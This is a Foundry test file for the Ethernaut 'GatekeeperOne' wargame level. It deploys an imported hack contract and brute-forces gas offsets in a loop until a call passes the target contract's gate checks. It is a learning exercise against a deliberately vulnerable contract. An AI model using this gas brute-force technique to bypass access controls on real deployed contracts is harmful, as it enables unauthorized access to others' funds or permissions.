// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/GatekeeperOne.sol";
import "../src/GatekeeperOneHack.sol";

contract GatekeeperOneTest is Test {
  GatekeeperOne public gatekeeperOneContract;
  GatekeeperOneHack public gatekeeperOneHackContract;
  address tony = address(0x01);
  address frank = address(0x02);

  function setUp() public {

    vm.startPrank(tony);
    vm.deal(tony, 5 ether);
    gatekeeperOneContract = GatekeeperOne(0x85aDc1a8e8c914F90b9aE41eadaB994801fFfe5B);
    vm.stopPrank();

    vm.startPrank(frank);
    vm.deal(frank, 5 ether);
    gatekeeperOneHackContract = new GatekeeperOneHack{value: 2 ether}(address(gatekeeperOneContract));
    vm.stopPrank();

  }

  function testEntry() public {
    vm.startPrank(0x359bfB5160946a55f03c080c2DC6975C8F970d5C);
    // IGateKeeperOne gatekeeperOneContract = IGateKeeperOne(0xFe34b7AEeBfAa13E76aa6Cf1D5Cf92Fb4186F54f);
    // Check every value of gas from 8191-(8191+8191);
    bool success = false;
    for (uint i = 0; i < 8191; i++) {
    // Test with each gas price and our pass for our mocked frank address
    if(!success) {

      try gatekeeperOneHackContract.enterGate{ gas: 950000 }(i){
          emit log_string('Passes with:');
          emit log_uint(i);
          emit log_address(gatekeeperOneContract.entrant());
          i = 8191;
          success = true;
          break;
      } catch {

      }
    } else {}

    }
    emit log_address(gatekeeperOneContract.entrant());
    emit log_address(address(gatekeeperOneHackContract));
    emit log_address(address(gatekeeperOneContract));
    // emit log_address(address(frank));

    vm.stopPrank();
  }
}
